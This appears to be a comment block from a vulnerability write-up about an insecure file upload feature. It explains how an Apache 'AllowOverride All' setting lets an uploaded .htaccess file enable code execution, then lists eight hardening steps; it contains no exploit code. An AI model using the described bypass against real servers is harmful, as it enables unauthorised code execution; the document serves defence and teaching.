# ðŸ’¥ Root Cause:
# - The upload feature does not sanitize file extensions or MIME types.
# - Apache is misconfigured with "AllowOverride All", allowing .htaccess files to override MIME handling.
# - This lets an attacker bypass extension filters and execute arbitrary code on the server.
    




    # ðŸš« How to Prevent This Vulnerability:
#
# âœ… 1. Disable .htaccess overrides:
#    In the Apache configuration, set "AllowOverride None" for upload directories.
#    This prevents attackers from using .htaccess to change how files are handled.
#
#    Example:
#    <Directory /var/www/html/uploads>
#        AllowOverride None
#    </Directory>
#
# âœ… 2. Store uploads outside the web root:
#    Save uploaded files in a directory that is not publicly accessible via the browser.
#    This ensures even if a malicious file is uploaded, it cannot be executed.
#
# âœ… 3. Whitelist allowed file types and extensions:
#    Only allow known-safe extensions like .jpg, .png, .gif, etc.
#    Reject all other types, especially anything that can be executed (e.g., .php, .phtml).
#
# âœ… 4. Sanitize file content, not just the name:
#    Validate file headers (magic bytes) to confirm the file is truly an image, not PHP code in disguise.
#
# âœ… 5. Use safe MIME types:
#    Donâ€™t trust user-submitted MIME types â€” verify server-side.
#
# âœ… 6. Remove execute permissions from upload folders:
#    If files in the uploads folder cannot be executed, even uploaded scripts won't run.
#
# âœ… 7. Log and monitor file uploads:
#    Detect suspicious file types, repeated uploads, or strange behavior early.
#
# âœ… 8. Apply Content Security Policy (CSP):
#    Helps reduce the impact of XSS and limits what uploaded files can do if accessed.
